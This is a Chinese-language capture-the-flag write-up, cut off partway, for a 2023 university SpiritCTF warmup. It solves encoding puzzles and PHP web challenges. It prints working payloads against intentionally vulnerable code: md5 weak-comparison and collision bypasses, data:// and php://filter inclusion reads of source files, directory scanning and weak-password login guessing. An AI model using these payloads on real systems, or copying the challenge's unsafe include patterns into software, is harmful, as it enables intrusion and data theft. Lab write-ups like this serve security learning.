        <content type="html"><![CDATA[<h1 id="比赛介绍"><a href="#比赛介绍" class="headerlink" title="比赛介绍"></a>比赛介绍</h1><blockquote><p>2023 SpiritCTF Warmup 为 2023 SpiritCTF 热身赛<br>属于 吉林大学“山石网科”杯第五届大学生网络安全竞赛 系列赛事<br>比赛时间为 2023&#x2F;9&#x2F;5 - 2023&#x2F;10&#x2F;17</p></blockquote><h1 id="热身赛与正赛"><a href="#热身赛与正赛" class="headerlink" title="热身赛与正赛"></a>热身赛与正赛</h1><ul><li>热身赛题目包括但不限于各个方向的入门题目、与本次 2023 SpiritCTF 难度相当的题目、往年SpiritCTF（校赛）的题目，用于帮助大家有针对性的入门</li><li>热身赛期间成绩突出的同学将被定向邀请至 2023 SpiritCTF 线下赛场（注：线下赛场与线上赛场采用同样的比赛地址解答相同题目，不过线下赛场更能体会到 CTF 的比赛氛围，并且入围线下赛场的同学可以获得 Spirit 战队的精美周边）</li><li>线下赛场名额上限为 45 ，热身赛总榜靠前、解出某道难度较高热身赛题给出题人留下深刻印象都有可能被定向邀请到线下赛场</li><li>正赛于十月下旬开始，模式为组队赛（三人一队）</li></ul><h1 id="Signin1"><a href="#Signin1" class="headerlink" title="Signin1"></a>Signin1</h1><p>题目描述：</p><blockquote><p>App1e_Tree在赛前七天倒计时海报中的三张使用不同编码隐藏了一个flag，你能找到它么！<br>请移步SpiritGame 2023赛事群 143102236 精华消息中获取海报，关注比赛实时动态！</p></blockquote><p>三张海报中中含有的信息如下</p><p>1.仅剩2天海报</p><blockquote><p>Spirit{that_1s_the_fun_0f_ctf_</p></blockquote><p>2.仅剩4天海报</p><blockquote><p>5F396F30645F6C75636B5F7477305F755F62795F30766572663130777D</p></blockquote><p>3.仅剩7天海报</p><blockquote><p>\u006e\u0065\u0076\u0065\u0072\u005f\u0067\u0031\u0076\u0065\u005f\u0075\u0070</p></blockquote><p>根据信息内容判断</p><ul><li>1 为明文</li><li>2 为字符密文</li><li>3 为unicode密文</li></ul><p>1 为明文，即有</p><pre class="language-none"><code class="language-none">Spirit&#123;that_1s_the_fun_0f_ctf_</code></pre><p>2 通过 <a href="https://www.toolhelper.cn/EncodeDecode/EncodeDecode">字符在线加解密工具</a> 解密后获得</p><pre class="language-none"><code class="language-none">_9o0d_luck_tw0_u_by_0verf10w&#125;</code></pre><p>3 通过 <a href="https://www.toolhelper.cn/EncodeDecode/UnicodeChineseEncodeDecode">Unicode在线加解密工具</a> 解密后获得</p><pre class="language-none"><code class="language-none">never_g1ve_up</code></pre><p>根据 <code>flag</code> 格式 <code>Spirit&#123;xxxx&#125;</code> 推测应为132组合</p><p>Flag:</p><pre class="language-none"><code class="language-none">Spirit&#123;that_1s_the_fun_0f_ctf_never_g1ve_up_9o0d_luck_tw0_u_by_0verf10w&#125;</code></pre><h1 id="Signin2"><a href="#Signin2" class="headerlink" title="Signin2"></a>Signin2</h1><p>纯纯签到题</p><p>题目描述：</p><blockquote><p>Welcome to <a href="mailto:&#119;&#101;&#98;&#x40;&#x73;&#x70;&#105;&#114;&#x69;&#x74;&#x32;&#48;&#x32;&#51;&#x2e;&#x63;&#x74;&#x66;">&#119;&#101;&#98;&#x40;&#x73;&#x70;&#105;&#114;&#x69;&#x74;&#x32;&#48;&#x32;&#51;&#x2e;&#x63;&#x74;&#x66;</a>~</p></blockquote><p>打开页面后发现有一个 <code>Get Your Flag</code> 按钮</p><p><img src="image-1.png" alt="image-1.png"></p><p>然而点击后没有什么反应（？）</p><h2 id="1-方法一：DevTools-curl"><a href="#1-方法一：DevTools-curl" class="headerlink" title="1. 方法一：DevTools + curl"></a>1. 方法一：DevTools + curl</h2><p>F12打开开发人员工具，调至网络选项卡，开启记录网络日志并刷新页面，选项卡内容显示如下：</p><p><img src="image-2.png" alt="image-2.png"></p><p>点击 <code>Get Your Flag</code> 按钮后，网络选项卡显示内容变化为如下：</p><p><img src="image-3.png" alt="image-3.png"></p><p>发现新增了一行 <code>flag</code> 通信包，于是推测该按钮发送了 <code>/flag</code> 请求，</p><p>并根据选项卡显示内容判断页面经过了 <code>301重定向</code></p><p>于是使用 <code>curl</code> 工具：</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-v</span> <span class="token punctuation">(</span>SpiritCTF Server URL with port<span class="token punctuation">)</span>/flag</code></pre><p>返回内容如下</p><pre class="language-none"><code class="language-none">HTTP&#x2F;1.1 301 Moved PermanentlyFlag: U3Bpcml0ezQ4NDY0YzNlLTJhMGQtNDVhNC04NTE4LWFlZTJhZDg5NDM4Y30&#x3D;Location: &#x2F;Server: Microsoft-NetCore&#x2F;2.0Date: xxxxxxxTransfer-Encoding: chunked</code></pre><p>由此获得经过加密后的 <code>Flag</code> 信息</p><pre class="language-none"><code class="language-none">Flag: U3Bpcml0ezk1YTkyYTkwLTYyMTMtNGRmMC05MjE2LTU4M2YwMGZmMjdlM30&#x3D;</code></pre><h2 id="2-方法二：Burp-Suite"><a href="#2-方法二：Burp-Suite" class="headerlink" title="2. 方法二：Burp Suite"></a>2. 方法二：Burp Suite</h2><p>打开 <code>Burp Suite</code> 开启浏览器流量代理<br><img src="image-4.png" alt="image-4.png"><br>发现该按钮指向 <code>/flag</code> 路径并被301重定向</p><p>在 <code>/flag</code> 路径的 <code>Response</code> 中发现 <code>Flag</code> 信息如下：</p><pre class="language-none"><code class="language-none">Flag: U3Bpcml0ezk1YTkyYTkwLTYyMTMtNGRmMC05MjE2LTU4M2YwMGZmMjdlM30&#x3D;</code></pre><h2 id="3-Flag-解密"><a href="#3-Flag-解密" class="headerlink" title="3. Flag 解密"></a>3. Flag 解密</h2><p>结合该字符串形式，判断flag经过了Base64加密<br>使用<a href="https://www.toolhelper.cn/EncodeDecode/Base64EncodeDecode">Base64在线加解密工具</a><br><img src="image-5.png" alt="image-5.png"><br>即可获得flag如下</p><blockquote><p>Spirit{95a92a90-6213-4df0-9216-583f00ff27e3}</p></blockquote><h1 id="baby-php"><a href="#baby-php" class="headerlink" title="baby_php"></a>baby_php</h1><p>题目描述：</p><blockquote><p>\&#x2F;\&#x2F;PHPは最高~\&#x2F;\&#x2F;</p><p>for hackers</p></blockquote><p>打开页面发现题目给出了一段<code>php</code>代码如下：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Never gonna give you up'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">==</span> <span class="token variable">$b</span> <span class="token operator">||</span> <span class="token class-name">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Never gonna let you down'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Never gonna run around and desert you'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'Never gonna make you cry'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Never gonna say goodbye'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'d'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'d'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Never gonna tell a lie and hurt you'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">include</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'d'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></span></code></pre><p><del>你被骗啦（误）</del></p><p>接下来对代码的各个部分进行分析</p><h2 id="1-第一部分"><a href="#1-第一部分" class="headerlink" title="1. 第一部分"></a>1. 第一部分</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Never gonna give you up'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>此处判断是否通过<code>GET</code>方式传入 <code>a</code> 和 <code>b</code> 两个arg</p><p>如果任意一个参数没有传入 则终止运行并抛出</p><blockquote><p>Never gonna give you up</p></blockquote><p>因此可以通过页面回显判断代码运行到的位置</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">==</span> <span class="token variable">$b</span> <span class="token operator">||</span> <span class="token class-name">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Never gonna let you down'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>此处代码接收 <code>a</code> &amp; <code>b</code> 两个arg的值</p><p>并只有在</p><blockquote><ul><li><code>a</code> 不等于 <code>b</code></li><li><code>a</code> 的MD5值与 <code>b</code> 相等时</li></ul></blockquote><p>才能通过检测</p><p>否则终止运行并抛出</p><blockquote><p>Never gonna let you down</p></blockquote><p>此处常见的绕过方式有：</p><ul><li>构造非字符串参数绕过 (仅限于旧版本PHP)</li><li>利用弱类型特性0e绕过</li><li>直接使用md5碰撞</li></ul><h3 id="1-1-构造非字符串参数绕过-仅限于旧版本PHP"><a href="#1-1-构造非字符串参数绕过-仅限于旧版本PHP" class="headerlink" title="1.1 构造非字符串参数绕过 (仅限于旧版本PHP)"></a>1.1 构造非字符串参数绕过 (仅限于旧版本PHP)</h3><blockquote><p>已知旧版本PHP在调用 <code>md5</code> 函数时如果传入的参数为非字符串类型，会直接返回NULL</p></blockquote><p>利用这一特性，我们可以通过构造 <code>a</code> 和 <code>b</code> 两个不同的非字符串参数<br>使得”NULL&#x3D;NULL”成立来绕过这一检测</p><p>例如我们可以使用数组类型绕过</p><blockquote><p>a&#x3D;[]&#x3D;1&amp;b&#x3D;[]&#x3D;2</p></blockquote><h3 id="1-2-利用弱类型特性0e绕过"><a href="#1-2-利用弱类型特性0e绕过" class="headerlink" title="1.2 利用弱类型特性0e绕过"></a>1.2 利用弱类型特性0e绕过</h3><blockquote><p>由于PHP的弱类型特性，若 <code>md5</code> 函数返回的字符串以 <code>0e</code> 开头，会被PHP识别为科学计数法，将其值转化为0</p></blockquote><p>因此只需要 <code>a</code> 和 <code>b</code> 不相同且经过 <code>md5</code> 加密后的密文都以 <code>0e</code> 开头即可</p><p>常见的符合条件的字符串如下：</p><blockquote><ul><li>QNKCDZO</li><li>240610708</li><li>s878926199a</li><li>s155964671a</li><li>s214587387a</li><li>s214587387a</li></ul></blockquote><p>在其中任意选择并赋给 <code>a</code> &amp; <code>b</code> 即可</p><h3 id="1-3-直接使用md5碰撞"><a href="#1-3-直接使用md5碰撞" class="headerlink" title="1.3 直接使用md5碰撞"></a>1.3 直接使用md5碰撞</h3><blockquote><p>此方法亦可用于”&#x3D;&#x3D;&#x3D;”强类型碰撞，旨在寻找含有相同md5值的不同字符串</p></blockquote><p>经查找后可以找到如下 <code>a</code> &amp; <code>b </code>满足条件：</p><pre class="language-none"><code class="language-none">a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</code></pre><h2 id="2-第二部分"><a href="#2-第二部分" class="headerlink" title="2. 第二部分"></a>2. 第二部分</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Never gonna run around and desert you'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'Never gonna make you cry'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Never gonna say goodbye'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>此处判断是否通过 <code>GET</code> 方式传入了arg <code>c</code> ，</p><p>然后使用 <code>file_get_contents</code> 函数读取 <code>c</code>，</p><p>将读取结果与 <code>Never gonna make you cry</code> 比对</p><p>若比对失败则终止运行并抛出</p><blockquote><p>Never gonna say goodbye</p></blockquote><p>由于此处用到了文件读取函数 <code>file_get_contents</code></p><p>因此考虑使用 <code>data://</code> 伪协议绕过</p><blockquote><p>data:&#x2F;&#x2F;text&#x2F;plain,(string)</p></blockquote><p>因此将arg <code>c</code> 赋值为 <code>data://text/plain,Never gonna make you cry</code></p><h2 id="3-第三部分"><a href="#3-第三部分" class="headerlink" title="3. 第三部分"></a>3. 第三部分</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'d'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'d'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Never gonna tell a lie and hurt you'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">include</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'d'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre><p>最后一处代码将arg <code>d</code> 的默认值设置为 <code>flag.php</code> ，提示我们在 <code>flag.php</code> 中寻找线索</p><blockquote><p>但是我们如果直接将这种含有PHP代码的文件的文件名传入<code>include</code>函数，<br>就会由于PHP代码被执行而无法通过可视文本的形式泄露</p></blockquote><p>因此想到使用PHP伪协议的 <code>Filter</code> ，把代码内容经过base64加密后再进行输出</p><p><code>d=php://filter/read=convert.base64-encode/resource=flag.php</code></p><p>得到输出内容如下</p><pre class="language-none"><code class="language-none">PD9waHAKJGZsYWcgPSAkX0VOVlsnRkxBRyddID8&#x2F;ICdTcGlyaXR7ZmFrZS1mbGFnLXF3cX0nOwpmaWxlX3B1dF9jb250ZW50cygnc3Bpcml0ZmxhZ3F3cScsICRmbGFnKTsK</code></pre><p>经过 <a href="https://www.toolhelper.cn/EncodeDecode/Base64EncodeDecode">Base64在线加解密工具</a> 解密后得到</p><p><img src="image-6.png" alt="image-6.png"></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token variable">$_ENV</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'FLAG'</span><span class="token punctuation">]</span> <span class="token operator">??</span> <span class="token string single-quoted-string">'Spirit&#123;fake-flag-qwq&#125;'</span><span class="token punctuation">;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'spiritflagqwq'</span><span class="token punctuation">,</span> <span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>发现 <code>flag</code> 信息被写入了 <code>spiritflagqwq</code> 文件中</p><h3 id="3-1-小盲点"><a href="#3-1-小盲点" class="headerlink" title="3.1 小盲点"></a>3.1 小盲点</h3><p>然而做题过程中发现出题人并没有预先将<code>flag</code>信息写入<code>spiritflagqwq</code>文件中，<br>因此需要先执行一次 <code>flag.php</code> 将flag信息写入 <code>spiritflagqwq</code> 文件中</p><blockquote><p>可以通过不传入arg <code>d</code>,使得其被置为默认值 <code>flag.php</code> 来使得 <code>flag.php</code> 文件被执行</p></blockquote><p>最后将 arg <code>d</code> 设置为 <code>spiritflagqwq</code> 来读取 <code>spiritflagqwq</code> 文件</p><p>得到如下信息：</p><pre class="language-none"><code class="language-none">U3Bpcml0ezFjODJlODRmLWNiOTctNDQ3Ni1iYTI5LTdmZDY2ODcxMGM3MH0&#x3D;</code></pre><p>经过 <a href="https://www.toolhelper.cn/EncodeDecode/Base64EncodeDecode">Base64在线加解密工具</a> 解密后得到<br><img src="image-7.png" alt="image-7.png"></p><blockquote><p>Spirit{1c82e84f-cb97-4476-ba29-7fd668710c70}</p></blockquote><h1 id="ez-Web"><a href="#ez-Web" class="headerlink" title="ez_Web"></a>ez_Web</h1><p>模版套娃题</p><p>题目描述：</p><blockquote><p>Hint: flag在&#x2F;flag里～</p></blockquote><h2 id="1-第一层：301-Redirect"><a href="#1-第一层：301-Redirect" class="headerlink" title="1. 第一层：301 Redirect"></a>1. 第一层：301 Redirect</h2><p>打开页面后显示403 Forbidden，提示页面入口不在这里</p><p><img src="image-8.png" alt="image-8.png"></p><p>使用dirsearch目录工具扫描<br><img src="image-9.png" alt="image-9.png"></p><p>发现两个目录</p><pre class="language-none"><code class="language-none">200 - 382B - &#x2F;index.html200 -  19B - &#x2F;test.php</code></pre><p>访问 <code>index.html</code></p><p>发现又是 <code>301 Redirect</code></p><p>同 <code>Web - signin</code> 可以用 <code>curl</code> 或 <code>burp suite</code> 方法</p><h3 id="1-1-curl-方法"><a href="#1-1-curl-方法" class="headerlink" title="1.1 curl 方法"></a>1.1 curl 方法</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token punctuation">(</span>SpiritCTF Server URL with port<span class="token punctuation">)</span>/index.html</code></pre><h3 id="1-2-burp-suite-方法"><a href="#1-2-burp-suite-方法" class="headerlink" title="1.2 burp suite 方法"></a>1.2 burp suite 方法</h3><p><img src="image-10.png" alt="image-10.png"><br>得到如下信息</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>IE=edge<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>测测你的网速<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">        window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">'test.php'</span>        <span class="token comment">//fffff_test.php</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>提示我们到 <code>fffff_test.php</code> 中去寻找线索</p><h2 id="2-第二层：GET-传参"><a href="#2-第二层：GET-传参" class="headerlink" title="2. 第二层：GET 传参"></a>2. 第二层：GET 传参</h2><p>访问 <code>fffff_test.php</code> 获得如下信息</p><pre class="language-none"><code class="language-none">什么!?你连JQK都没有?给我一个JQK,我给你一个789。</code></pre><p>根据信息构造 <code>GET</code> 传参：<code>?JQK=789</code></p><h2 id="3-第三层：file-get-contents-利用"><a href="#3-第三层：file-get-contents-利用" class="headerlink" title="3. 第三层：file_get_contents() 利用"></a>3. 第三层：file_get_contents() 利用</h2><p>传参后进入 <code>/fffFfff1ag.php</code> ，得到如下代码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>     <span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag/i'</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">echo</span> <span class="token variable">$content</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>由于Spirit的flag没有flag标识，因此无需绕过PHP的 <code>preg_match</code></p><p>直接传入 <code>file=/flag</code> 即可</p><h3 id="3-1-PS-preg-match-绕过"><a href="#3-1-PS-preg-match-绕过" class="headerlink" title="3.1 PS: preg_match 绕过"></a>3.1 PS: preg_match 绕过</h3><p>preg_match 对 $content 内容的过滤可通过PHP的 <code>Filter</code> 伪协议绕过</p><pre class="language-none"><code class="language-none">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag</code></pre><p>通过将flag内容使用base64密文输出，可有效过滤 <code>preg_match</code> 对flag包含的检测</p><p>只需将密文经过 <a href="https://www.toolhelper.cn/EncodeDecode/Base64EncodeDecode">Base64在线加解密工具</a> 解密即可获得flag</p><p>得到flag</p><pre class="language-none"><code class="language-none">Spirit&#123;eec1fb16-5aa0-4ab2-95c3-dbf3b582be28&#125;</code></pre><p>至此，三层套娃全部结束</p><h1 id="ez-Web2"><a href="#ez-Web2" class="headerlink" title="ez_Web2"></a>ez_Web2</h1><p><del>又是套娃题(误)</del></p><p>题目描述：</p><blockquote><p>Hint: robots</p></blockquote><h2 id="1-第一层：robots-泄露"><a href="#1-第一层：robots-泄露" class="headerlink" title="1. 第一层：robots 泄露"></a>1. 第一层：robots 泄露</h2><p>打开页面后显示</p><pre class="language-none"><code class="language-none">系统维护中，暂未开放</code></pre><p>根据 Hint 内容访问 <code>/robots.txt</code> ，得到如下信息：</p><pre class="language-none"><code class="language-none">User-Agent: *Disallow: login.php</code></pre><h2 id="2-第二层：弱密码爆破"><a href="#2-第二层：弱密码爆破" class="headerlink" title="2. 第二层：弱密码爆破"></a>2. 第二层：弱密码爆破</h2><p>根据提示访问 <code>login.php</code></p><p><img src="image-11.png" alt="image-11.png"></p><p>发现一个登录框，进行弱密码尝试</p><p>尝试后发现</p><blockquote><p>用户名：admin<br>密码：123456</p></blockquote><h2 id="3-第三层：file-put-contents-利用"><a href="#3-第三层：file-put-contents-利用" class="headerlink" title="3. 第三层：file_put_contents() 利用"></a>3. 第三层：file_put_contents() 利用</h2><p>登录后返回如下PHP代码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token 